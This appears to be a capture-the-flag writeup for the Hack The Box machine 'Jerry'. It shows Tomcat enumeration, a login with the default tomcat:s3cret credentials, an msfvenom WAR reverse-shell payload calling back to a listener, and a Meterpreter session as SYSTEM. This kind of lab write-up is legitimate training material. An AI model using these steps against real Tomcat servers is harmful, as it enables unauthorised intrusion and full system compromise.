---
layout: single
title: "Jerry - Windows HacktheBox Writeup"
categories:
  - Writeup
tags:
  - Easy
  - Windows
  - HackTheBox
classes:
  - wide
---

>"*Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat isoften found exposed and configured with common or weak credentials.*"

 *Hack The Box* - Jerry synopsis

**ENUMERATION**

Nmap results:
```
PORT     STATE SERVICE VERSION

8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

```
When checking out the website, we see a default install of Tomcat. 
Exploring it, we see pages such as 'server status', 'manager app' and 'host manager'. Clicking on manager app, the website prompts us with a login option. Let's cancel it for now and keep looking. 
Cancelling the request brings us to a 401 unauthorised page. 
The 401 page details how to add users. The example uses default creds. 
We should try these, just in case they haven't been changed. 

Reloading the page, we can enter the default creds (tomcat:s3cret). It works!

We see a Web Application Manager. Looking further down the page, we see a section where the user can deploy WAR files. 
Let's use this to try and get a shell. 

**FOOTHOLD / EXPLOITATION**

>"*A WAR file (Web Application Resource or Web application ARchive) is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages (HTML and related files) and other resources that together constitute a web application.*"

Using Msfvenom, we can craft a nice payload containing our reverse windows shell. Which we'll catch with Meterpreter. 
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 --format war -o hellothere.war
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of war file: 2469 bytes
Saved as: hellothere.war

```
Using this payload, we can upload it to the website to then be able to activate the shell by visiting the file. 
However to activate it, we need to know the name of it. So we need to quickly unzip the file and find out.   

```
$ unzip hellothere.war                    
Archive:  hellothere.war
  inflating: META-INF/MANIFEST.MF    
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
  inflating: zzponqiftq.jsp 
```
*NB: We can also use the command jar to list the contents of the war.* 

Going back to meterpreter, we see that a session has opened once we've clicked on the payload and set the right path. 
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp 
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.10.14.8

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Sending stage (200262 bytes) to 10.10.10.95
[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.95:49192) at 2021-09-25 17:30:39 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
```
Using the 'getuid' command, we also find out we are NT AUTHORITY\SYSTEM. This means we have full system own. We just need to look for the flags now. 

```
C:\>cd Users\Administrator\Desktop\flags
cd Users\Administrator\Desktop\flags

C:\Users\Administrator\Desktop\flags> dir
dir
 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,594,592,256 bytes free

C:\Users\Administrator\Desktop\flags> type 2*
type 2*

2 for the price of 1.txt


user.txt
7004dbce***********************

root.txt
04a8b36e***********************
```
And there they are both! The User flag and the Root flag.